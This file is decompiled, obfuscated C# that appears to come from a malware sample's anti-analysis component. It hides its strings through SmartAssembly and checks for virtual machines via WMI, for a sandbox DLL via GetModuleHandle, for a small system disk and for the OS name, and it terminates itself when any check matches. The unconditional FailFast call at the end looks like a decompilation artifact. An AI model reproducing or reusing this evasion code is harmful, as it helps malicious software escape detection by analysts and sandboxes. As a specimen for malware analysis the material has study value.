using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

internal sealed class JGleGMbjRJyD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void uLqhvcDFUjMOCj()
	{
		if (lsRXnnrtdnO() || kpdLIcpNcL() || FsTHzsUbkv() || mvoutTRuipVF())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool FsTHzsUbkv()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool mvoutTRuipVF()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107371460)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool lsRXnnrtdnO()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107371455));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107371438)).ToString()!.ToLower();
							if ((text == getString_0(107370877) && current.get_Item(getString_0(107370848)).ToString()!.ToUpperInvariant().Contains(getString_0(107370839))) || text.Contains(getString_0(107370858)) || current.get_Item(getString_0(107370848)).ToString() == getString_0(107370817))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool kpdLIcpNcL()
	{
		try
		{
			if (GetModuleHandle(getString_0(107370832)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static JGleGMbjRJyD()
	{
		Strings.CreateGetStringDelegate(typeof(JGleGMbjRJyD));
	}
}
